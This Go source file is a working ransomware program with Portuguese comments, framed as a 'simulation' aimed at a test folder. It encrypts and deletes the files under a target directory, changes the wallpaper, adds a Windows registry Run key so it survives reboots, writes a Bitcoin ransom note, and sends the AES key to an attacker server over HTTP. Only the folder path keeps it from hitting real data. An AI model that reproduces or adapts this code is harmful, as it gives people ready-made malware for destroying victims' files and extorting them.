package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	_ "embed"
	"errors"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

//go:embed wallpaper.png
var wallpaperData []byte

const (
	targetDir        = `C:\teste` // Diretório de teste
	warningFilename  = "!!!WARNING!!!.txt"
	encryptedFileExt = ".aeehh"
	ransomNote       = `
☠️ TODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS! ☠️
- PAGUE 0.5 BTC PARA: bc1qFAKEADDRESS1234567890`
	startupKeyName = "RansomDemo"
	attackerServer = "http://192.168.100.18:8080/key" // Substitua pelo IP do Fedora!
)

var (
	user32           = windows.NewLazySystemDLL("user32.dll")
	systemParameters = user32.NewProc("SystemParametersInfoW")
	encryptionKey    []byte
)

// Gera uma chave AES-256
func generateKey() ([]byte, error) {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return nil, fmt.Errorf("erro ao gerar chave: %v", err)
	}
	return key, nil
}

// Criptografa dados usando AES-GCM
func encryptAES(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = rand.Read(nonce); err != nil {
		return nil, err
	}

	return gcm.Seal(nonce, nonce, data, nil), nil
}

// Envia a chave para o servidor do atacante (Fedora)
func sendKeyToAttacker(key []byte) error {
	client := &http.Client{Timeout: 5 * time.Second}
	req, err := http.NewRequest("POST", attackerServer, bytes.NewBuffer(key))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/octet-stream")

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("erro ao conectar ao servidor: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("servidor retornou status: %s", resp.Status)
	}

	return nil
}

func setNewWallpaper() error {
	tempWallpaper := filepath.Join(os.TempDir(), "ransom_wallpaper.png")
	if err := os.WriteFile(tempWallpaper, wallpaperData, 0644); err != nil {
		return fmt.Errorf("erro ao criar wallpaper: %v", err)
	}

	pathUTF16, err := windows.UTF16PtrFromString(tempWallpaper)
	if err != nil {
		return err
	}

	ret, _, _ := systemParameters.Call(
		uintptr(0x0014), // SPI_SETDESKWALLPAPER
		0,
		uintptr(unsafe.Pointer(pathUTF16)),
		uintptr(0x01|0x02), // SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
	)

	if ret == 0 {
		return errors.New("falha ao definir o wallpaper")
	}
	return nil
}

func addToStartup() error {
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("erro ao obter caminho do executável: %v", err)
	}

	key, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE,
	)
	if err != nil {
		return fmt.Errorf("erro ao abrir registro: %v", err)
	}
	defer key.Close()

	if err := key.SetStringValue(startupKeyName, exePath); err != nil {
		return fmt.Errorf("erro ao adicionar à inicialização: %v", err)
	}
	return nil
}

func encryptFiles() error {
	return filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			log.Printf("[!] Erro ao acessar %s: %v", path, err)
			return nil
		}

		if info.IsDir() || strings.HasSuffix(info.Name(), encryptedFileExt) {
			return nil
		}

		time.Sleep(100 * time.Millisecond) // Simular ataque lento

		data, err := os.ReadFile(path)
		if err != nil {
			log.Printf("[!] Erro ao ler %s: %v", path, err)
			return nil
		}

		encryptedData, err := encryptAES(data)
		if err != nil {
			log.Printf("[!] Erro ao criptografar %s: %v", path, err)
			return nil
		}

		newName := "[RANSOM]" + strings.TrimSuffix(info.Name(), filepath.Ext(info.Name())) + encryptedFileExt
		newPath := filepath.Join(filepath.Dir(path), newName)

		if err := os.WriteFile(newPath, encryptedData, 0644); err != nil {
			log.Printf("[!] Erro ao escrever %s: %v", newPath, err)
			return nil
		}

		if err := os.Remove(path); err != nil {
			log.Printf("[!] Erro ao remover original %s: %v", path, err)
		}

		log.Printf("[+] Criptografado: %s -> %s", path, newPath)
		return nil
	})
}

func main() {
	log.SetFlags(log.Ltime | log.Lshortfile)
	log.Println("[*] Iniciando simulação de ransomware...")

	// Gerar chave única
	key, err := generateKey()
	if err != nil {
		log.Fatal("[!] ERRO FATAL: ", err)
	}
	encryptionKey = key

	// Configurar ambiente
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		log.Fatal("[!] ERRO ao criar diretório: ", err)
	}

	// Ações maliciosas
	if err := setNewWallpaper(); err != nil {
		log.Println("[!] Erro no wallpaper: ", err)
	}

	if err := addToStartup(); err != nil {
		log.Println("[!] Erro na inicialização: ", err)
	}

	if err := encryptFiles(); err != nil {
		log.Fatal("[!] ERRO na criptografia: ", err)
	}

	// Enviar chave para o Fedora
	if err := sendKeyToAttacker(encryptionKey); err != nil {
		log.Println("[!] Erro ao enviar chave: ", err)
	} else {
		log.Println("[+] Chave enviada ao servidor do atacante!")
	}

	// Criar nota de resgate
	if err := os.WriteFile(
		filepath.Join(targetDir, warningFilename),
		[]byte(ransomNote),
		0644,
	); err != nil {
		log.Println("[!] Erro ao criar aviso: ", err)
	}

	log.Println("[+] Simulação concluída. Chave gerada:", fmt.Sprintf("%x", encryptionKey))
}
